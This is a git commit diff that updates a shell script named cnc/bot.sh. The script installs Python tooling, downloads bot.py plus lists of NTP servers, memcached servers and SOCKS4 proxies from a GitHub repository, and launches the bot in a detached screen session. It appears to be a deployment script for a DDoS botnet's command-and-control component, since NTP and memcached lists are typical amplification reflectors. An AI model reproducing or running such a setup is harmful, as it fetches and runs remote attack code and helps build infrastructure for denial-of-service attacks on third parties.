23a7d2f43c142a97392c778864bb78b1b6c05642
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-07-27 17:58:29 +0700

    Update bot.sh

--- cnc/bot.sh
+++ cnc/bot.sh
@@ -1,6 +1,15 @@
 apt update -y
 apt upgrade -y 
-apt install python3
+apt install python3 -y
+apt install python3-pip -y
+apt install tmux -y
+apt install screen -y
 mkdir bot
 cd bot
-wget 
+wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/bot.py
+wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/requirements.txt
+wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/ntpServers.txt
+wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/memsv.txt
+wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/socks4.txt
+pip3 install -r requirements.txt
+screen -dmS bot python3 bot.py
